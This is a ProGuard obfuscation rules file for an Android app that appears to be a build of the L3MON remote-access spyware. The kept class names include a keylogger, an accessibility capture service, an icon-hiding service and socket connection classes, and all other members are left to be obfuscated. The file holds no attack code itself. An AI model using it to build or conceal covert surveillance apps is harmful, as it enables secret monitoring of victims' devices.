# ============================================
# KEEP - Nome da classe mantido (Manifest)
# Métodos e campos serão ofuscados
# ============================================

-keep class com.etechd.l3mon.MainActivity { <init>(...); }
-keep class com.etechd.l3mon.MainService { <init>(...); }
-keep class com.etechd.l3mon.L3M0NKeyLogger { <init>(...); }
-keep class com.etechd.l3mon.AccessibilityCaptureService { <init>(...); }
-keep class com.etechd.l3mon.NotificationListener { <init>(...); }
-keep class com.etechd.l3mon.MyReceiver { <init>(...); }
-keep class com.etechd.l3mon.ServiceReciever { <init>(...); }

# Inner class do Hide Icon
-keep class com.etechd.l3mon.AccessibilityCaptureService$HideIconBackgroundService { <init>(...); }

# Classes usadas por reflexão
-keep class com.etechd.l3mon.IOSocket { <init>(...); }
-keep class com.etechd.l3mon.ConnectionManager { <init>(...); }

# Manter apenas os construtores públicos necessários
-keepclassmembers class * extends android.app.Service {
    public <init>(...);
}
-keepclassmembers class * extends android.content.BroadcastReceiver {
    public <init>(...);
}
-keepclassmembers class * extends android.accessibilityservice.AccessibilityService {
    public <init>(...);
}